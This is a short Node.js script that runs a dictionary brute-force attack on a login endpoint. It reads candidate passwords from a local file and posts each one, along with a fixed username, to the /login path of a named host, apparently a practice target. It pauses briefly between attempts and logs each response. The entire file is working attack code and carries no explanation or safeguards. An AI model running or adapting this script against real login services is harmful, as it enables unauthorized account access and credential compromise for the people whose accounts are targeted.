const fs = require('fs');
const https = require('https');
const path = require('path');

const TARGET_HOSTNAME = 'hackme.apiva.se';
const TARGET_PORT = 443;
const USERNAME = 'anders.persson';
const DELAY_MS = 100;
const PASSWORD_FILE = 'passwords.txt';

async function sendLoginRequest(username, password) {
    return new Promise((resolve) => {
        const postData = JSON.stringify({
            username: username,
            password: password
        });

        const options = {
            hostname: TARGET_HOSTNAME,
            port: TARGET_PORT,
            path: '/login',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
            }
        };

        const req = https.request(options, (res) => {
            let responseData = '';
            
            res.on('data', (chunk) => {
                responseData += chunk;
            });

            res.on('end', () => {
                const responseMessage = res.statusCode === 200 ? responseData : 'FAILURE';
                console.log(`[${res.statusCode}] Password: ${password} -> ${responseMessage}`);
                resolve(responseMessage);
            });
        });

        req.on('error', (error) => {
            console.error(`Not so good: ${error.message}`);
            resolve(null);
        });

        req.write(postData);
        req.end();
    });
}

async function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function main() {
    const passwordFilePath = path.join(__dirname, PASSWORD_FILE);
    
    try {
        const passwords = fs.readFileSync(passwordFilePath, 'utf8')
            .split('\n')
            .map(p => p.trim())
            .filter(p => p.length > 0);

        for (const password of passwords) {
            await sendLoginRequest(USERNAME, password);
            await sleep(DELAY_MS);
        }
    } catch (error) {
        console.error(`Error reading password file: ${error.message}`);
    }
}

main();
